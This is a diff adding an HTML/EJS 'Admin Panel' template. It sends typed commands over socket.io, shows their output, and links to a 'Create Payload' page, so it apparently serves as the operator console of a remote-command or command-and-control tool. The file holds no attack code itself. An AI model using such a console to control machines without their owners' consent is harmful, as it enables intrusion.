@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel</title>
+</head>
+<body>
+    <h1>Welcome <%=locals.user.name%></h1>
+    <input placeholder="Command" id="command"/> 
+    <button id="btn">Send</button>
+    <button ><a href="/cp/<%= locals.user._id %>/">Create Payload</a></button>
+    <p id="output"></p>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.3.0/socket.io.js"></script>
+    <script>
+        var socket = io(); 
+        var commandInput = document.getElementById('command'), btn = document.getElementById('btn'), output = document.getElementById('output');
+        btn.addEventListener('click', (event) => {
+            socket.emit('command', commandInput.value); 
+        }); 
+        socket.emit('init', "<%= locals.user._id %>")
+        socket.on('command_output', (data) => {  
+            output.innerText = data; 
+        })
+    </script>
+</body>
+</html>
